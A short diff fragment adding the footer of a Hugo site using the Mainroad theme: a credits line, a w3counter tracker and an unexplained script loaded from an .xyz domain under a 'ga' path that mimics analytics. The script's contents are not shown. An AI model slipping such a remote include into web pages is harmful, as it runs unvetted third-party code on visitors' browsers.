+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
